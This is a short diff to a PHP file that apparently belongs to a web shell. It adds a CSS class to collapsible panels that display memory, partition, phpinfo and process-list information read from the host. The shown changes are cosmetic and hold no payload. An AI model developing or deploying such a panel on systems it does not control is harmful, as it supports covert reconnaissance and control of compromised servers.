+			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>" .
 				"<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>";
 			$i_buffs = explode("\n", $i_buff);
 			foreach($i_buffs as $i){
@@ -2833,7 +2839,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 
 		// partition
 		if ($i_buff=trim(read_file("/proc/partitions"))){
-			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>" .
+			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>" .
 				"<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>" .
 				"<table class='dataView'><tr>";
 			$i_buff = preg_replace("/\ +/", " ", $i_buff);
@@ -2856,7 +2862,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 	
 	$phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
 	foreach($phpinfo as $p=>$i){
-		$sBuff .= "<p class='boxtitle' onclick=\"toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>";
+		$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>";
 		ob_start();
 		eval("phpinfo($i);");
 		$b = ob_get_contents();
@@ -2910,7 +2916,8 @@ if (isset($p['me']) && $p['me'] === 'process'){
 					$h = false;
 					$psln = explode($wexp, $psa, $wcount);
 					$sBuff .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
-					foreach($psln as $p) $sBuff .= '<th>' . trim(trim($p), '"') . '</th>';
+					foreach($psln as $p) 
+						$sBuff .= '<th class="touch">' . trim(trim($p), '"') . '</th>';
 					$sBuff .= '</tr>';
 				} else {
 					$psln = explode($wexp, $psa, $wcount);
